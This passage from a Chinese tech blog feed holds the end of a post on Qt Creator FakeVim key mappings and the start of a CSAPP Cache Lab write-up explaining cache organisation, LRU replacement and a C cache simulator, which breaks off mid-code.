:run&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>这样，就将 “ ;r “ 快捷键绑定为 Run命令了。</p><p>其余命令同理，现在fake vim中的ex command命令中写上mapping命令，然后在vimrc中mapping键位。</p><p>下面是我个人的全部qtvimrc：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line">&quot; 显示当前模式</span><br><span class="line">set showmode</span><br><span class="line">&quot; 共享系统粘贴板</span><br><span class="line">set clipborad&#x3D;unamed</span><br><span class="line">&quot; 打开行号</span><br><span class="line">set number</span><br><span class="line">&quot; 打开相对行号</span><br><span class="line">&quot; set relativenumber</span><br><span class="line">&quot; 设置命令历史记录条数</span><br><span class="line">set history&#x3D;2000</span><br><span class="line">&quot; 关闭兼容vi</span><br><span class="line">set nocompatible</span><br><span class="line">&quot; 开启语法高亮功能</span><br><span class="line">syntax enable</span><br><span class="line">&quot; 允许用指定语法高亮配色方案替换默认方案</span><br><span class="line">syntax on</span><br><span class="line">&quot; 模式搜索实时预览,增量搜索</span><br><span class="line">set incsearch</span><br><span class="line">&quot; 设置搜索高亮</span><br><span class="line">set hlsearch</span><br><span class="line">&quot; 忽略大小写 (该命令配合smartcase使用较好，否则不要开启)</span><br><span class="line">set ignorecase</span><br><span class="line">&quot; 模式查找时智能忽略大小写</span><br><span class="line">set smartcase</span><br><span class="line">&quot; vim自身命令行模式智能补全</span><br><span class="line">set wildmenu</span><br><span class="line">&quot; 总是显示状态栏</span><br><span class="line">set laststatus&#x3D;2</span><br><span class="line">&quot; 显示光标当前位置</span><br><span class="line">set ruler</span><br><span class="line">&quot; 高亮显示当前行&#x2F;列</span><br><span class="line">set cursorline</span><br><span class="line">&quot;set cursorcolumn</span><br><span class="line">&quot; 禁止折行</span><br><span class="line">set nowrap</span><br><span class="line">&quot; 将制表符扩展为空格</span><br><span class="line">set expandtab</span><br><span class="line">&quot; 设置编辑时制表符占用空格数</span><br><span class="line">set tabstop&#x3D;4</span><br><span class="line">&quot; 设置格式化时制表符占用空格数</span><br><span class="line">set shiftwidth&#x3D;4</span><br><span class="line">&quot; 让 vim 把连续数量的空格视为一个制表符</span><br><span class="line">set softtabstop&#x3D;4</span><br><span class="line">&quot; 基于缩进或语法进行代码折叠</span><br><span class="line">set foldmethod&#x3D;indent</span><br><span class="line">set foldmethod&#x3D;syntax</span><br><span class="line">&quot; 启动 vim 时关闭折叠代码</span><br><span class="line">set nofoldenable</span><br><span class="line"></span><br><span class="line">&quot; 设置前导键</span><br><span class="line">&quot; let mapleader&#x3D;&quot;;&quot;</span><br><span class="line">&quot; 暂时取消搜索高亮快捷键</span><br><span class="line">nnoremap &lt;silent&gt; ;l :&lt;C-u&gt;nohlsearch&lt;CR&gt;&lt;C-l&gt;</span><br><span class="line"></span><br><span class="line">&quot; 移动相关</span><br><span class="line">&quot; 前一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; [b :w&lt;CR&gt;:bprevious&lt;CR&gt;</span><br><span class="line">&quot; 后一个缓冲区</span><br><span class="line">nnoremap &lt;silent&gt; ]b :w&lt;CR&gt;:bnext&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键到行首和行尾</span><br><span class="line">map H ^</span><br><span class="line">map L $</span><br><span class="line">&quot; 定义快速跳转</span><br><span class="line">nmap ;t &lt;C-]&gt;</span><br><span class="line">&quot; 定义快速跳转回退</span><br><span class="line">nmap ;T &lt;C-t&gt;</span><br><span class="line">&quot; 标签页后退 ---标签页前进是gt</span><br><span class="line">nmap gn gt</span><br><span class="line">nmap gp gT</span><br><span class="line"></span><br><span class="line">&quot; 文件操作相关</span><br><span class="line">&quot; 定义快捷键关闭当前分割窗口</span><br><span class="line">nmap ;q :q&lt;CR&gt;</span><br><span class="line">&quot; 定义快捷键保存当前窗口内容</span><br><span class="line">nmap ;w :w&lt;CR&gt;</span><br><span class="line"></span><br><span class="line">&quot; 窗口操作相关</span><br><span class="line">map &lt;C-j&gt; &lt;C-W&gt;j</span><br><span class="line">map &lt;C-k&gt; &lt;C-W&gt;k</span><br><span class="line">map &lt;C-h&gt; &lt;C-W&gt;h</span><br><span class="line">map &lt;C-l&gt; &lt;C-W&gt;l</span><br><span class="line"></span><br><span class="line">&quot; 使用 qt内部功能</span><br><span class="line">&quot; run operation</span><br><span class="line">map ;r :run&lt;CR&gt;</span><br><span class="line">&quot; copy operation</span><br><span class="line">map ;c :copy&lt;CR&gt;</span><br><span class="line">&quot; paste operation</span><br><span class="line">map ;v :paste&lt;CR&gt;</span><br><span class="line">&quot; cut operation</span><br><span class="line">map ;x :cut&lt;CR&gt;</span><br><span class="line">&quot; Select All</span><br><span class="line">map ;a :selectall&lt;CR&gt;</span><br><span class="line">&quot; reformat code</span><br><span class="line">map ;f :reformatcode&lt;CR&gt;</span><br><span class="line">&quot; 找到usage</span><br><span class="line">map ;u :findusages&lt;CR&gt;</span><br><span class="line">&quot; 调用idea的replace操作</span><br><span class="line">map ;; :replace&lt;CR&gt;</span><br></pre></td></tr></table></figure><p>基本上是从以前的vimrc配置中copy过来的，所以有些设置在qt中是无效的，但是不影响使用。 关键在 “使用qt内部功能”项下的映射。有些可惜的是fakevim不支持leader键位，所以只能在每处mapping中都硬编码为；  。</p><p>4.反缩进问题</p><p>qtcreator有个反人类的地方在于，写代码换行，会自动缩进，但是退格却又需要退几次才能回到上一行，可以改为：</p><p><img data-src="https://pic.downk.cc/item/5f1a556014195aa594c428c1.jpg"></p><p>剩下的就看个人配置了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;项目原因，要写点qt代码。记录下个人配置：&lt;/p&gt;
    
    </summary>
    
    
      <category term="杂文" scheme="https://www.ravenxrz.ink/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="vim" scheme="https://www.ravenxrz.ink/tags/vim/"/>
    
  </entry>
  
  <entry>
    <title>Csapp-Cachelab题解</title>
    <link href="https://www.ravenxrz.ink/archives/153b500d.html"/>
    <id>https://www.ravenxrz.ink/archives/153b500d.html</id>
    <published>2020-07-29T10:52:24.000Z</published>
    <updated>2020-09-06T07:37:36.749Z</updated>
    
    <content type="html"><![CDATA[<p>本次 lab, cachelab.</p><h2 id="0-说明"><a href="#0-说明" class="headerlink" title="0. 说明"></a>0. 说明</h2><p>从这个lab开始，终于开始编写一些高级语言的代码了，而不像之前要去分析汇编。但是这并不意味这题目就简单了，实际上，cachelab耗费了我2天多的时间。ok，言归正传，这个lab的目的是什么呢？</p><p>cachelab帮助我们理解计算机存储体系中的重要组成部分–cache。 理解cache是如何组织的，如何工作的，又是如何影响我们的程序的性能的。</p><a id="more"></a><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200726101259903.png" style="zoom: 33%;" /><p>cache站立于整个存储体系的上端（低于寄存器），其重要性不言而喻了。</p><p>题目说明：</p><p>cachelab只有2个题目。</p><ol><li>写一个cache工作的模拟器，给一段内存访问的trace file，根据trace file仿真，得到这段trace file的hit，miss，eviction数。</li><li>编写cache友好的代码，具体是给3种给定大小的矩阵A，求A的转置，每种大小都要miss要求。</li></ol><p>具体题目请参照cachelab的write up。</p><h2 id="1-第一部分–cache工作方式仿真"><a href="#1-第一部分–cache工作方式仿真" class="headerlink" title="1. 第一部分–cache工作方式仿真"></a>1. 第一部分–cache工作方式仿真</h2><p>做完这个题目，可以让人理解cache的组织，工作方式，替换策略等。<strong>先说一下题目，</strong>本题主要可以分为以下几个部分：</p><ol><li>trace file</li></ol><p>题目会给出一些trace files， trace file的格式如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">I 0400d7d4,8</span><br><span class="line"> M 0421c7f0,4</span><br><span class="line"> L 04f6b868,8</span><br><span class="line"> S 7ff0005c8,8</span><br></pre></td></tr></table></figure><p>语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[space]operation address,size</span><br></pre></td></tr></table></figure><p>The operation ﬁeld denotes the type of memory access: “I” denotes an instruction load, “L” a data load,  “S” a data store, and “M” a data modify (i.e., a data load followed by a data store). There is never a space before each “I”. There is always a space before each “M”, “L”, and “S”. The address ﬁeld speciﬁes a 64-bit hexadecimal memory address. The size ﬁeld speciﬁes the number of bytes accessed by the operation.</p><p>值得注意的是，我们只关注 data ，也就是 M,L,S开头的指令，不关注I开头的指令。解析时，可根据开头是否有空格来解析。</p><p>trace file就是我们要编写的代码的输入源，我们要做的就是根据这些trace file来仿真。</p><ol start="2"><li>cache的组织方式</li></ol><p>题目要求，最终的程序可以接受一些参数，改变cache的组织方式。 如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;csim-ref -s 4 -E 1 -b 4 -t traces&#x2F;yi.trace</span><br></pre></td></tr></table></figure><p>代表：</p><ul><li>set的bit位数为: 4</li><li>E=1，即一个set中只有一个cacheline</li><li>b=4，即一个cache line的block位数为4</li><li>trace file的路径为 traces/yi.trace</li></ul><p>具体可使用的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Usage: .&#x2F;csim-ref [-hv] -s &lt;s&gt; -E &lt;E&gt; -b &lt;b&gt; -t &lt;tracefile&gt;</span><br><span class="line">• -h: Optional help ﬂag that prints usage info</span><br><span class="line">• -v: Optional verbose ﬂag that displays trace info</span><br><span class="line">• -s &lt;s&gt;: Number of set index bits (S &#x3D; 2^s is the number of sets)</span><br><span class="line">• -E &lt;E&gt;: Associativity (number of lines per set)</span><br><span class="line">• -b &lt;b&gt;: Number of block bits (B &#x3D; 2^b is the block size)</span><br><span class="line">• -t &lt;tracefile&gt;: Name of the valgrind trace to replay</span><br></pre></td></tr></table></figure><ol start="3"><li>cacheline 的替换策略，采用LRU</li></ol><p>ok，知道这些了，题目还给了我们一个标准答案，csim-ref, 我们自己最终的程序名为csim. 最终只要csim的输入输出和csim-ref相同即可。</p><p><strong>写程序之前，一定要分析好再写，所以先来分析下我们该怎么做：</strong></p><p>需要哪些背景知识：</p><p>cache的组织方式：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200726102158585.png" style="zoom: 50%;" /><p>这张图，给出了cache的组织方式以及cacheline的read方式。</p><p>cache的组织方式非常直观，主要参数为 S, E, B. 这3个参数也决定了cache的相联关系：</p><ol><li>E=1, 直接映射</li><li>E!=1,S!=1, E路S组相联</li><li>S=1, 全相联映射。（内存和Disk就是这种映射）</li></ol><p>cacheline的read分为以下几步：</p><ol><li>根绝set bit，决定set索引</li><li>比较该组的所有line，是否有匹配的tag。如有，并且valid有效，则hit，并根据b 决定数据偏移。否则，第3步。</li><li>load该cacheline到cache中，如果该组还有空块（valid=0),则加载到空块中，如果没有空块，则根据替换策略进行替换。</li></ol><p><strong>总结下read(load)操作:</strong></p><ol><li>hit, 能在当前cache中找到cacheline</li><li>miss，不能在cahce中找到cacheline，但是该组中有空cacheline。</li><li>eviction，不能再cache中找到cacheline，且该组中没有空cacheline，需要根据替换策略进行替换。</li></ol><p><strong>现在在看下write(store)操作：</strong></p><p>cachelab采用的的是write-back+write-allocate方式。所以，一旦我们的store miss了，需要将该块load到cache中。分析可以下3中情况：</p><ol><li>hit, 能在当前cache中找到cacheline</li><li>miss，不能在cahce中找到cacheline，但是该组中有空cacheline。</li><li>eviction，不能在cache中找到cacheline，且该组中没有空cacheline，需要根据替换策略进行替换。</li></ol><p><strong>最后看下modify操作：</strong></p><p>modify结合了load和store操作，分析可得以下3种情况：</p><ol><li>hit(load) + hit(store), load命中，store也命中</li><li>miss(load)+hit(store), load miss，但是当前cache set中有空块，直接load到cache即可，后续store命中。</li><li>miss(load)+eviction(load)+hit(store),cache种没有该cacheline，且该组没有空块，最后store可命中</li></ol><blockquote><p>额外啰嗦一段：</p><p>cacheline和block非常容易搞混，因为一会说将某个数据块 load到cache，一会又说将某个cacheline load到cache中。 </p><p>其实通常我们说将xx数据块load到cache中，这个数据块是包围在一个cacheline中的，cacheline除了这个数据块以外，还会包含一些元数据，如tag，valid，以及用于实现替换策略的辅助位等。</p><p><strong>简单来说，cacheline包含block， 通常说的cacheline大小，都是说的cacheline内部的block的大小。如32字节，64字节等，都是说的cacheline内部的block的大小为32，64字节</strong></p></blockquote><p>好了，分析到这里，基本上把整个流程走了一遍。剩下一些与主题无关代码，包括参数解析，trace file解析，可自行看以下代码（代码比较长，因为我加了详细注释，同时为了规范，加了一些“无用”代码，但看着应该没有压力）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * @author: raven</span></span><br><span class="line"><span class="comment"> * @date 2020-7-26</span></span><br><span class="line"><span class="comment"> * @description: 模拟仿真计算机cache的 load modify load过程</span></span><br><span class="line"><span class="comment"> * @issue:</span></span><br><span class="line"><span class="comment"> * 1.没有考虑任何复杂度问题</span></span><br><span class="line"><span class="comment"> * 2.函数没有做安全性检查,比如判定null等</span></span><br><span class="line"><span class="comment"> * 3.main函数中使用到的内存引用没有free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;cachelab.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE         <span class="comment">// getline函数不属于c标准, 需要开启GNU扩展</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------前置定义-----------------------*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILE_NAME_LEN 100</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OS_PTR_LEN 64</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">address64_t</span>;     <span class="comment">// 64-bit address</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_HIT(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;hit\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_MISS(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;miss\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEBUG_EVICT(verbose) do&#123;<span class="meta-keyword">if</span>(verbose) printf(<span class="meta-string">&quot;evict\n&quot;</span>);&#125;while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*--------------------------数据结构定义-----------------------*/</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 参数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">param</span> 